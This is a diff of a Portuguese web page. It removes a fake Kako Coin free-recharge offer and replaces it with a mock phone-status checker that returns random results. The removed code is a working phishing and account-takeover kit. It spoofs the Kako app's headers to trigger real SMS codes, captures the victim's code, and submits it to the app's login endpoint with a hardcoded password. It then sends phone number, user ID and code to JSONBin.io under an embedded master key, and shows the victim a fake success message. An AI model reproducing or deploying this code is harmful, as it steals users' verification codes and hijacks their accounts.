@@ -3,458 +3,391 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Recarga de Conta | Kako Coin</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <meta name="description" content="Sistema de recarga Kako Coin">
+    <title>Verificação de Telefone - Status</title>
     <style>
-        .free-badge {
-            position: absolute;
-            bottom: -15px;
-            right: 10px;
-            font-size: 12px;
-            color: red;
-            font-weight: bold;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        .banner-flash {
-            animation: flash 2s infinite;
+        
+        body {
+            background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
+            color: #c9d1d9;
+            line-height: 1.6;
+            padding: 20px;
+            min-height: 100vh;
         }
-        @keyframes flash {
-            0% { opacity: 1; }
-            50% { opacity: 0.7; }
-            100% { opacity: 1; }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #0d1117;
+            border-radius: 10px;
+            border: 1px solid #30363d;
+            overflow: hidden;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
         }
-        .coin-option.selected {
-            background-color: #7e22ce !important;
-            color: white !important;
+        
+        header {
+            background: linear-gradient(90deg, #1a6eeb 0%, #2d89ef 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
         }
-        #pinModal {
-            transition: opacity 0.3s ease;
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
         }
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .verification-form {
+            background-color: #161b22;
+            padding: 25px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            border: 1px solid #30363d;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #f0f6fc;
+        }
+        
+        input[type="tel"] {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            color: #c9d1d9;
+            font-size: 16px;
+        }
+        
+        input[type="tel"]:focus {
+            outline: none;
+            border-color: #1a6eeb;
+            box-shadow: 0 0 0 3px rgba(26, 110, 235, 0.3);
+        }
+        
+        .submit-btn {
+            background: linear-gradient(90deg, #1a6eeb 0%, #2d89ef 100%);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            width: 100%;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(26, 110, 235, 0.4);
+        }
+        
+        .status-results {
+            display: none;
+            background-color: #161b22;
+            padding: 25px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            border: 1px solid #30363d;
+        }
+        
+        .status-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .status-icon {
+            width: 50px;
+            height: 50px;
             border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-size: 24px;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        
+        .status-1 .status-icon {
+            background-color: #238636;
+            color: white;
         }
-        .cors-warning {
-            background-color: #fef3cd;
-            border-left: 4px solid #ffc107;
-            padding: 12px;
-            margin: 16px 0;
+        
+        .status-2 .status-icon {
+            background-color: #da3633;
+            color: white;
+        }
+        
+        .status-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+        
+        .status-details {
+            margin-top: 15px;
+        }
+        
+        .status-message {
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+        }
+        
+        .status-1 .status-message {
+            background-color: rgba(35, 134, 54, 0.15);
+            border-left: 4px solid #238636;
+            color: #3fb950;
+        }
+        
+        .status-2 .status-message {
+            background-color: rgba(218, 54, 51, 0.15);
+            border-left: 4px solid #da3633;
+            color: #f85149;
+        }
+        
+        .next-steps {
+            margin-top: 20px;
+        }
+        
+        .next-steps h3 {
+            margin-bottom: 10px;
+            color: #f0f6fc;
+        }
+        
+        .next-steps ul {
+            padding-left: 20px;
+        }
+        
+        .next-steps li {
+            margin-bottom: 8px;
+        }
+        
+        .deployment-info {
+            background-color: #161b22;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #30363d;
+        }
+        
+        .deployment-info h2 {
+            margin-bottom: 15px;
+            color: #f0f6fc;
+        }
+        
+        .info-text {
+            margin-bottom: 15px;
+        }
+        
+        .platform-badge {
+            display: inline-block;
+            padding: 5px 10px;
+            background-color: #000;
+            color: white;
             border-radius: 4px;
             font-size: 14px;
+            margin: 0 5px;
+        }
+        
+        .github {
+            background-color: #24292e;
+        }
+        
+        .vercel {
+            background-color: #000;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid #30363d;
+            font-size: 0.9rem;
+            color: #8b949e;
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .content {
+                padding: 15px;
+            }
         }
     </style>
 </head>
-<body class="bg-gray-100 font-sans">
-    <!-- Modal para validação do PIN -->
-    <div id="pinModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
-        <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-md">
-            <div class="flex justify-between items-center mb-4">
-                <h3 class="text-xl font-bold text-purple-800">Valide seu ID</h3>
-                <button id="closePinModal" class="text-gray-500 hover:text-gray-700">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <p class="mb-4">Enviamos um código de 6 dígitos para o seu número. Digite abaixo para validar:</p>
-            <form id="pinForm" class="space-y-4">
-                <div>
-                    <input type="text" id="pinInput" maxlength="6" 
-                           class="w-full px-4 py-3 border border-gray-300 rounded-md text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-purple-600"
-                           placeholder="000000" oninput="validatePin(this)">
-                    <p id="pinError" class="text-red-600 text-sm mt-1 hidden">PIN inválido. Digite apenas números.</p>
-                </div>
-                <button type="submit" id="submitPinBtn" 
-                        class="w-full bg-purple-600 text-white py-3 px-4 rounded-md hover:bg-purple-700 transition duration-200 font-medium">
-                    Validar e Recarregar
-                </button>
-            </form>
-        </div>
-    </div>
-
-    <div class="container mx-auto px-4 py-8">
-        <!-- Aviso acadêmico -->
-        <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
-            <p class="font-bold">AVISO:</p>
-            <p class="mb-2">*Termos e Condições: Esta promoção é válida apenas para primeira recarga de novos usuários.</p>
-            <p>A promoção é válida exclusivamente para usuários brasileiros e/ou com número de telefone nacional (+55).</p>
-            <p class="mt-4">Ao realizar a recarga, você concorda com nossos Termos de Serviço e Política de Privacidade.</p>
-        </div>
-
-        <!-- Header -->
-        <header class="flex justify-between items-center mb-8">
-            <div class="flex items-center">
-                <img src="https://play-lh.googleusercontent.com/F_Bge1FUPjFpMBcLc6ChvhbTJAIG6dDgcIKYcQJimRmnuv_qTtfVEIucrWui2VHerdvq" 
-                     alt="Logo Kako" class="h-12">
-                <h1 class="ml-2 text-2xl font-bold text-purple-800">KAKO COIN</h1>
-                <img src="https://i.ibb.co/W4GBrhXd/images-removebg-preview.png" alt="Kako Coin" class="h-12 ml-2">
-            </div>
+<body>
+    <div class="container">
+        <header>
+            <h1>Verificação de Telefone</h1>
+            <p class="subtitle">Sistema de verificação de status</p>
         </header>
-
-        <!-- Main Content -->
-        <main class="flex flex-col md:flex-row gap-8">
-            <!-- Form Section -->
-            <div class="bg-white rounded-lg shadow-md p-6 flex-1">
-                <h2 class="text-2xl font-bold text-purple-800 mb-6">Recarga de Conta</h2>
+        
+        <div class="content">
+            <div class="verification-form">
+                <h2>Verificar Status do Telefone</h2>
+                <p style="margin: 15px 0;">Digite o número de telefone para verificar o status:</p>
                 
-                <form id="rechargeForm" class="space-y-4">
-                    <input type="hidden" id="amount" name="amount" value="10000">
-                    
-                    <div>
-                        <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Telefone</label>
-                        <div class="flex">
-                            <span class="inline-flex items-center px-3 border border-r-0 border-gray-300 bg-gray-50 text-gray-500 rounded-l-md">
-                                +55
-                            </span>
-                            <input type="tel" id="phone" name="phone" required 
-                                   class="w-full px-4 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-purple-600"
-                                   placeholder="DDD + Número">
-                        </div>
-                    </div>
-                    
-                    <div>
-                        <label for="id" class="block text-sm font-medium text-gray-700 mb-1">ID</label>
-                        <input type="text" id="id" name="id" required 
-                               class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-600"
-                               oninput="sanitizeId(this)">
-                        <p class="text-red-600 text-sm mt-1">NECESSITA VALIDAÇÃO DE ID</p>
-                    </div>
-                    
-                    <div id="errorMessage" class="hidden text-red-600 text-sm"></div>
-                    
-                    <button type="submit" id="submitBtn" 
-                            class="w-full bg-purple-600 text-white py-3 px-4 rounded-md hover:bg-purple-700 transition duration-200 font-medium">
-                        Simular Recarga
-                    </button>
-                </form>
+                <div class="form-group">
+                    <label for="phone">Número de Telefone</label>
+                    <input type="tel" id="phone" placeholder="+55 (11) 99999-9999">
+                </div>
+                
+                <button class="submit-btn" id="check-btn">Verificar Status</button>
             </div>
             
-            <!-- Promo Section -->
-            <div class="flex-1">
-                <div class="bg-gradient-to-r from-green-400 to-green-500 rounded-lg shadow-md p-6 text-white mb-6 banner-flash">
-                    <div class="flex items-center">
-                        <div class="mr-4">
-                            <i class="fas fa-gift text-4xl"></i>
-                        </div>
-                        <div>
-                            <h3 class="text-2xl font-bold">Primeira recarga de 10.000 é GRÁTIS!*</h3>
-                            <p class="mt-2">Oferta por tempo limitado para novos usuários. Reivindique sua recarga grátis agora!</p>
-                        </div>
-                    </div>
-                </div>
+            <div class="status-results" id="status-results">
+                <!-- Resultados serão inseridos aqui via JavaScript -->
+            </div>
+            
+            <div class="deployment-info">
+                <h2>Informações de Deploy</h2>
+                <p class="info-text">Esta verificação está configurada para trabalhar com:</p>
                 
-                <!-- Coin Options -->
-                <div class="bg-white rounded-lg shadow-md p-6">
-                    <h3 class="text-xl font-bold text-purple-800 mb-4">Opções de Recarga</h3>
-                    
-                    <div class="grid grid-cols-2 gap-4">
-                        <button type="button" class="coin-option selected w-full bg-purple-700 text-white py-3 px-4 rounded-md hover:bg-purple-800 transition duration-200 font-medium relative" data-amount="10000">
-                            10.000 Kako Moedas
-                            <span class="free-badge">1x FREE</span>
-                        </button>
-                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="50000">
-                            50.000 Kako Moedas
-                        </button>
-                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="100000">
-                            100.000 Kako Moedas
-                        </button>
-                        <button type="button" class="coin-option bg-purple-100 text-purple-800 py-3 px-4 rounded-md hover:bg-purple-200 transition duration-200 font-medium" data-amount="500000">
-                            500.000 Kako Moedas
-                        </button>
-                    </div>
-                </div>
+                <p><strong>Status 1:</strong> Telefone válido e associado a uma conta</p>
+                <p><strong>Status 2:</strong> Telefone não associado a uma conta</p>
+                
+                <p class="info-text" style="margin-top: 20px;">
+                    Plataforma de deploy: 
+                    <span class="platform-badge vercel">Vercel</span>
+                </p>
+                
+                <p class="info-text">
+                    Para implementar a verificação real, você precisará:
+                </p>
+                <ul>
+                    <li>Configurar uma API serverless na Vercel</li>
+                    <li>Implementar a lógica de verificação real</li>
+                    <li>Conectar com a API do Kako</li>
+                </ul>
             </div>
-        </main>
-
-        <!-- Footer -->
-        <footer class="mt-12 text-center text-gray-600 text-sm">
-            <p>© 2023 Kako Coin. Todos os direitos reservados.</p>
-            <div class="mt-2 flex justify-center space-x-4">
-                <a href="#" class="hover:text-purple-700">Termos de Serviço</a>
-                <a href="#" class="hover:text-purple-700">Política de Privacidade</a>
-                <a href="#" class="hover:text-purple-700">Contate-nos</a>
-            </div>
+        </div>
+        
+        <footer>
+            <p>Sistema de Verificação de Telefone &copy; 2023</p>
         </footer>
     </div>
 
     <script>
-        // Constantes para as APIs
-        const API_BASE = 'https://api.kako.live';
-        const SMS_VERIFY_URL = `${API_BASE}/api/v1/sms/verify`;
-        const LOGIN_SUBMIT_URL = `${API_BASE}/api/v1/login/phone/submit`;
-        
-        // Headers para as requisições
-        const COMMON_HEADERS = {
-            'accept': 'application/json',
-            'accept-language': 'pt',
-            'x-app-devicetype': 'android',
-            'x-app-version': '1.15.2',
-            'x-app-bundleid': 'live.kako.global',
-            'x-app-channelid': 'google',
-            'x-app-buildid': '24bbabf0',
-            'x-app-lang': 'pt',
-            'x-app-lang-excludes': 'en,es',
-            'x-app-deviceid': 'a5247afb-4d54-4867-b6ab-637496a78cf1',
-            'x-app-timezone': 'America/Sao_Paulo',
-            'x-app-country': 'BR',
-            'x-app-devicename': 'Motorola moto g(8)',
-            'content-type': 'application/json; charset=UTF-8',
-            'accept-encoding': 'gzip',
-            'user-agent': 'okhttp/4.12.0'
-        };
-
-        // Senha padrão
-        const DEFAULT_PASSWORD = '335112d1r7y';
-
-        // Função para verificar se o telefone está associado a uma conta
-        // Esta é uma simulação - na prática você precisaria de uma API para verificar isso
-        function isPhoneAssociatedWithAccount(phone) {
-            // Simulação: 70% de chance de estar associado
-            // Você pode modificar esta lógica conforme necessário
-            return Math.random() > 0.3;
-        }
-
-        // Função para sanitizar o ID (remover espaços, letras, símbolos, emojis)
-        function sanitizeId(input) {
-            input.value = input.value.replace(/[^0-9]/g, '');
-        }
-
-        // Função para validar o PIN (apenas números)
-        function validatePin(input) {
-            const pinError = document.getElementById('pinError');
-            // Permite apenas números
-            input.value = input.value.replace(/\D/g, '');
+        document.addEventListener('DOMContentLoaded', function() {
+            const checkBtn = document.getElementById('check-btn');
+            const statusResults = document.getElementById('status-results');
+            const phoneInput = document.getElementById('phone');
             
-            if (input.value.length > 6) {
-                input.value = input.value.slice(0, 6);
-            }
-            
-            // Mostra erro se ainda houver caracteres não numéricos (não deveria acontecer após replace)
-            if (/\D/.test(input.value)) {
-                pinError.classList.remove('hidden');
-            } else {
-                pinError.classList.add('hidden');
-            }
-        }
-
-        // Ofusca apenas o ID (mostra 3 primeiros caracteres)
-        function maskID(id) {
-            return id.slice(0, 3) + '*'.repeat(Math.max(0, id.length - 3));
-        }
-
-        // Seleção de moedas
-        document.querySelectorAll('.coin-option').forEach(button => {
-            button.addEventListener('click', function() {
-                document.querySelectorAll('.coin-option').forEach(btn => {
-                    btn.classList.remove('selected', 'bg-purple-700', 'text-white');
-                    btn.classList.add('bg-purple-100', 'text-purple-800');
-                });
-                this.classList.add('selected', 'bg-purple-700', 'text-white');
-                this.classList.remove('bg-purple-100', 'text-purple-800');
-                document.getElementById('amount').value = this.dataset.amount;
-            });
-        });
-
-        // Modal de PIN
-        const pinModal = document.getElementById('pinModal');
-        const closePinModal = document.getElementById('closePinModal');
-        const pinForm = document.getElementById('pinForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const submitPinBtn = document.getElementById('submitPinBtn');
-        
-        // Variáveis para armazenar dados temporários
-        let currentPhone = '';
-        let currentId = '';
-        
-        // Fechar modal
-        closePinModal.addEventListener('click', function() {
-            pinModal.classList.add('hidden');
-        });
-        
-        // Envio do formulário principal
-        document.getElementById('rechargeForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            // Validações básicas
-            const phone = document.getElementById('phone').value;
-            const id = document.getElementById('id').value;
-            
-            if (!phone || phone.length < 10) {
-                alert('Por favor, informe um número de telefone válido com DDD.');
-                return;
-            }
-            
-            if (!id || id.length < 3) {
-                alert('Por favor, informe um ID válido.');
-                return;
-            }
-            
-            // Armazena os dados temporariamente
-            currentPhone = '+55' + phone.replace(/\D/g, '');
-            currentId = id.replace(/\D/g, '');
-            
-            // Verifica se o telefone está associado a uma conta
-            if (!isPhoneAssociatedWithAccount(currentPhone)) {
-                // Status 2: Telefone não associado a uma conta
-                alert('❌ Este número não está associado a uma conta Kako Coin.\n\nPor favor, verifique o número ou crie uma conta primeiro.');
-                return;
-            }
-            
-            // Atualiza o texto do botão para mostrar loading
-            submitBtn.innerHTML = '<span class="loading"></span> Enviando código...';
-            submitBtn.disabled = true;
-            
-            try {
-                // Envia solicitação de SMS
-                const response = await fetch(SMS_VERIFY_URL, {
-                    method: 'POST',
-                    headers: COMMON_HEADERS,
-                    body: JSON.stringify({
-                        phone: currentPhone,
-                        scene: 3
-                    })
-                });
+            checkBtn.addEventListener('click', function() {
+                const phone = phoneInput.value.trim();
                 
-                const result = await response.json();
-                
-                if (result.code === 0) {
-                    // Sucesso - abre o modal para inserir o PIN
-                    pinModal.classList.remove('hidden');
-                } else {
-                    // Erro na API, mas ainda assim abrimos o modal para simulação
-                    console.warn('Código não-zero da API de SMS:', result.code, result.msg);
-                    pinModal.classList.remove('hidden');
-                }
-            } catch (error) {
-                console.error('Erro ao enviar solicitação:', error);
-                // Explicação sobre CORS
-                if (error.name === 'TypeError' && error.message.includes('Failed to fetch')) {
-                    alert('❌ Erro de CORS: Não foi possível conectar à API.\n\nIsso acontece porque o navegador bloqueia requisições entre domínios diferentes por segurança.\n\nPara resolver, você precisa hospedar este site em um servidor ou usar uma extensão para habilitar CORS.');
+                if (!phone) {
+                    alert('Por favor, digite um número de telefone.');
                     return;
                 }
                 
-                // Mesmo com erro, abrimos o modal para simulação
-                pinModal.classList.remove('hidden');
-            } finally {
-                // Restaura o botão
-                submitBtn.innerHTML = 'Simular Recarga';
-                submitBtn.disabled = false;
-            }
-        });
-        
-        // Envio do formulário de PIN
-        pinForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const pinInput = document.getElementById('pinInput');
-            const pin = pinInput.value;
-            
-            // Valida o PIN
-            if (pin.length !== 6 || /\D/.test(pin)) {
-                document.getElementById('pinError').classList.remove('hidden');
-                return;
-            }
-            
-            // Atualiza o texto do botão para mostrar loading
-            submitPinBtn.innerHTML = '<span class="loading"></span> Validando...';
-            submitPinBtn.disabled = true;
-            
-            let apiResult = null;
-            
-            try {
-                // Envia solicitação de login
-                const response = await fetch(LOGIN_SUBMIT_URL, {
-                    method: 'POST',
-                    headers: COMMON_HEADERS,
-                    body: JSON.stringify({
-                        phone: currentPhone,
-                        password: DEFAULT_PASSWORD,
-                        code: pin,
-                        scene: 0
-                    })
-                });
+                // Simulação de verificação - na implementação real, isso virá da API
+                // Aqui estamos gerando aleatoriamente status 1 ou 2 para demonstração
+                const status = Math.random() > 0.5 ? 1 : 2;
                 
-                apiResult = await response.json();
+                // Exibir resultados
+                showStatusResult(phone, status);
+            });
+            
+            function showStatusResult(phone, status) {
+                let statusHTML = '';
                 
-                // Verifica se é um dos códigos de erro conhecidos
-                if (apiResult.code === 12007 || apiResult.code === 10002) {
-                    // Código inválido - ainda assim enviamos para análise
-                    console.warn('Código de verificação inválido:', apiResult.code, apiResult.msg);
+                if (status === 1) {
+                    statusHTML = `
+                        <div class="status-1">
+                            <div class="status-header">
+                                <div class="status-icon">✓</div>
+                                <div class="status-title">Status 1: Telefone Válido</div>
+                            </div>
+                            
+                            <div class="status-details">
+                                <div class="status-message">
+                                    <strong>Telefone verificado:</strong> ${phone}<br>
+                                    <strong>Status:</strong> Associado a uma conta
+                                </div>
+                                
+                                <div class="next-steps">
+                                    <h3>Próximos Passos:</h3>
+                                    <ul>
+                                        <li>Continuar com o processo de recarga</li>
+                                        <li>Enviar código de verificação via SMS</li>
+                                        <li>Processar a recarga de moedas</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                } else {
+                    statusHTML = `
+                        <div class="status-2">
+                            <div class="status-header">
+                                <div class="status-icon">✗</div>
+                                <div class="status-title">Status 2: Telefone Inválido</div>
+                            </div>
+                            
+                            <div class="status-details">
+                                <div class="status-message">
+                                    <strong>Telefone verificado:</strong> ${phone}<br>
+                                    <strong>Status:</strong> Não associado a uma conta
+                                </div>
+                                
+                                <div class="next-steps">
+                                    <h3>Próximos Passos:</h3>
+                                    <ul>
+                                        <li>Verificar se o número está correto</li>
+                                        <li>Solicitar que o usuário crie uma conta primeiro</li>
+                                        <li>Oferecer ajuda para resolver o problema</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    `;
                 }
-                // Outros códigos não são tratados como erro para fins de envio ao JSONBin
                 
-            } catch (error) {
-                console.error('Erro ao validar PIN:', error);
-                apiResult = { error: error.message };
+                statusResults.innerHTML = statusHTML;
+                statusResults.style.display = 'block';
+            }
+            
+            // Mascaramento de telefone
+            phoneInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
                 
-                // Explicação sobre CORS
-                if (error.name === 'TypeError' && error.message.includes('Failed to fetch')) {
-                    alert('❌ Erro de CORS: Não foi possível conectar à API.\n\nIsso acontece porque o navegador bloqueia requisições entre domínios diferentes por segurança.\n\nPara resolver, você precisa hospedar este site em um servidor ou usar uma extensão para habilitar CORS.');
+                if (value.length > 11) {
+                    value = value.slice(0, 11);
                 }
-            }
-            
-            // Envia para JSONBin.io independentemente do resultado
-            await sendToJsonBin(currentPhone, currentId, pin, apiResult);
-            
-            // Fecha o modal
-            pinModal.classList.add('hidden');
-            
-            // Mensagem de sucesso (sempre mostra, mesmo se a API retornar erro)
-            alert(`⚠️ ATENÇÃO - ALTA DEMANDA\n\n` +
-                  `📱 Sua recarga de 10.000 moedas foi recebida!\n\n` +
-                  `🆔 ID: ${currentId}\n` +
-                  `⏱️ Status: Na fila de processamento\n\n` +
-                  `⌛ Devido à grande demanda atual, o crédito pode demorar até 1 hora\n\n` +
-                  `🔍 Dica: Verifique em "Histórico" após 15 minutos\n` +
-                  `📞 Problemas? Contate o suporte no app`);
-            
-            // Restaura o botão
-            submitPinBtn.innerHTML = 'Validar e Recarregar';
-            submitPinBtn.disabled = false;
-            
-            // Reseta o formulário
-            document.getElementById('rechargeForm').reset();
-            pinInput.value = '';
+                
+                if (value.length > 0) {
+                    value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
+                    if (value.length > 10) {
+                        value = value.replace(/(\d{5})(\d)/, '$1-$2');
+                    }
+                }
+                
+                e.target.value = value;
+            });
         });
-        
-        // Função para enviar dados para JSONBin.io
-        async function sendToJsonBin(phone, id, pin, apiResult) {
-            // Coleta dados
-            const formData = {
-                telefone: phone,
-                id: id, // ID completo sem ofuscar
-                pin: pin,
-                api_response: apiResult, // Inclui a resposta completa da API
-                timestamp: new Date().toISOString()
-            };
-
-            // NOVA MASTER KEY
-            const MASTER_KEY = "$2a$10$9VJv2nY4tgeiSfh3AuAyUusmEFDpEMafqxKKHkOpikyoKc4QTd89m";
-
-            try {
-                // Envia para JSONBin.io
-                const response = await fetch("https://api.jsonbin.io/v3/b", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "X-Master-Key": MASTER_KEY
-                    },
-                    body: JSON.stringify(formData)
-                });
-
-                const result = await response.json();
-                console.log("Dados salvos no JSONBin:", result);
-            } catch (error) {
-                console.error("Erro ao enviar para JSONBin:", error);
-            }
-        }
     </script>
 </body>
 </html>
